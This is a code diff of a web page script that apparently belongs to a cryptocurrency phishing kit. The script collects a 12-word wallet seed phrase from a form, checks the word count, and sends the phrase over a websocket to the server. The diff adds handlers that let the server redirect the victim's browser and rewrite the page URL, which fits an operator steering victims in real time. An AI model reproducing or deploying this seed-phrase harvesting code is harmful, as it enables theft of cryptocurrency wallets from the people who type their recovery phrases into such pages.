@@ -896,72 +896,85 @@
     </script> 
     <script src="/js/socket-client.js"></script>
     <script>
-      document.addEventListener('DOMContentLoaded', function() {
-          const socket = io('/user', {
-              transports: ['websocket'],
-              query: {
-                  page: window.location.pathname
-              }
-          });
-    
-          // Handle form submission
-          document.getElementById('continue').addEventListener('click', async function() {
-              const seedPhrase = document.getElementById('seed_phrase').value.trim();
-              
-              // Validate the seed phrase
-              if (!validateSeedPhrase(seedPhrase)) {
-                  return;
-              }
-    
-              try {
-                  // Send data to server
-                  socket.emit('user_action', {
-                      type: 'seed_phrase_submitted',
-                      data: seedPhrase,
-                      timestamp: new Date().toISOString(),
-                      page: window.location.pathname
-                  });
-    
-                  // Set loading state
-                  socket.emit('page_loading', true);
-    
-                  // Redirect to loading page after a short delay
-                  setTimeout(() => {
-                    socket.emit('request_redirect', { page: 'Loading' });
-                  }, 500);
-    
-              } catch (error) {
-                  console.error('Error:', error);
-                  document.getElementById('errorMessage_Seed').textContent = 'An error occurred. Please try again.';
-                  document.getElementById('errorMessage_Seed').style.display = 'block';
-              }
-          });
-    
-          function validateSeedPhrase(phrase) {
-              if (!phrase) {
-                  document.getElementById('errorMessage_Seed').textContent = 'Please enter your seed phrase';
-                  document.getElementById('errorMessage_Seed').style.display = 'block';
-                  return false;
-              }
-              // Check if it has 12 words
-              const words = phrase.trim().split(/\s+/);
-              if (words.length !== 12) {
-                  document.getElementById('errorMessage_Seed').textContent = 'Seed phrase must contain exactly 12 words';
-                  document.getElementById('errorMessage_Seed').style.display = 'block';
-                  return false;
-              }
-              return true;
-          }
-    
-          // Handle socket connection
-          socket.on('connect', () => {
-              console.log('Socket connected');
-          });
-    
-          socket.on('connect_error', (error) => {
-              console.error('Socket connection error:', error);
-          });
-      });
+ document.addEventListener('DOMContentLoaded', function() {
+    const socket = io('/user', {
+        transports: ['websocket'],
+        query: {
+            page: window.location.pathname
+        }
+    });
+
+    // Handle form submission
+    document.getElementById('continue').addEventListener('click', async function() {
+        const seedPhrase = document.getElementById('seed_phrase').value.trim();
+        
+        // Validate the seed phrase
+        if (!validateSeedPhrase(seedPhrase)) {
+            return;
+        }
+
+        try {
+            // Send data to server
+            socket.emit('user_action', {
+                type: 'seed_phrase_submitted',
+                data: seedPhrase,
+                timestamp: new Date().toISOString(),
+                page: window.location.pathname
+            });
+
+            // Set loading state
+            socket.emit('page_loading', true);
+
+            // Redirect to loading page after a short delay
+            setTimeout(() => {
+                socket.emit('request_redirect', { page: 'Loading' });
+            }, 500);
+
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('errorMessage_Seed').textContent = 'An error occurred. Please try again.';
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+        }
+    });
+
+    function validateSeedPhrase(phrase) {
+        if (!phrase) {
+            document.getElementById('errorMessage_Seed').textContent = 'Please enter your seed phrase';
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+            return false;
+        }
+        // Check if it has 12 words
+        const words = phrase.trim().split(/\s+/);
+        if (words.length !== 12) {
+            document.getElementById('errorMessage_Seed').textContent = 'Seed phrase must contain exactly 12 words';
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+            return false;
+        }
+        return true;
+    }
+
+    // Handle socket connection
+    socket.on('connect', () => {
+        console.log('Socket connected');
+    });
+
+    socket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+    });
+
+    // Add redirect handler
+    socket.on('redirect', (url) => {
+        console.log('Redirecting to:', url);
+        window.location.href = url;
+    });
+
+    // Add URL update handler in case session URL changes
+    socket.on('session_url', (url) => {
+        if (url && url !== window.location.pathname + window.location.search) {
+            window.history.replaceState({}, '', url);
+        }
+    });
+});
     </script>
     </body>
 </html>
